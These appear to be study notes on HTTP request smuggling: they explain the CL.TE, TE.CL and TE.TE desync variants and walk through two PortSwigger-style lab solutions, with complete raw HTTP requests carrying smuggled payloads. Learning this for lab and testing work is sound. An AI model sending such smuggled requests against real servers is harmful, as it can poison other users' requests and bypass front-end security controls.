 Request smuggling is primarily associated with *HTTP/1* requests. 
 However, websites that support HTTP/2 may be vulnerable, depending on their back-end architecture.

 Most HTTP request smuggling vulnerabilities arise because the HTTP/1 specification provides two different ways to specify where a request ends: 
 
 The Content-Length header and the Transfer-Encoding header. 

Content Length header :- it specifies the length of the message body in bytes
Transfer-Encoding header:- can be used to specify that the message body uses chunked encoding

*****How to perform an HTTP request smuggling attack*****

 Classic request smuggling attacks involve placing both the Content-Length header and the Transfer-Encoding header into a single HTTP/1 request and manipulating these so that the front-end and back-end servers process the request differently. The exact way in which this is done depends on the behavior of the two servers:

-> CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
-> TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
-> TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

-------------------------------------------------------------------------------------------------------------------------------------------------------------
TIP:- Use HTTP Rquest Smuggler extension.

#1 Lab: HTTP request smuggling, basic CL.TE vulnerability

     1. Send request to repeater and change  to HTTP 1.1 using inspector
     2. Chang request method to POST 
     3. POST / HTTP/1.1
        Host: 0a9e00a3034a32ae82e7e289004200b2.web-security-academy.net
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 6
        Transfer-Encoding: chunked

        0

        GET /throws404 HTTP/1.1
        X-Ignore: X

     4. Send the requst and after it send the normal request and lab is solved.

--------------------------------------------------------------------------------------------------------------------------------------------------------------

#2 Lab: HTTP request smuggling, basic CL.TE vulnerability

     1. Downgrade HTTP protocol to HTTP 1.1 using inspector and change request method to POST
     2. Disable automatic update of Content-Length
     3. Show non- printable characters
     4. Then send the below request :-
         POST / HTTP/1.1
         Host: 0acf00940373f42281b020d5009000fb.web-security-academy.net
         Content-Type: application/x-www-form-urlencoded
         Content-Length: 6
         Transfer-Encoding: chunked

         0
         
         G 
     5. Send the request and then send the normal request and lab is solved. but in normal request change HTTP method and GET to POST

--------------------------------------------------------------------------------------------------------------------------------------------------------------

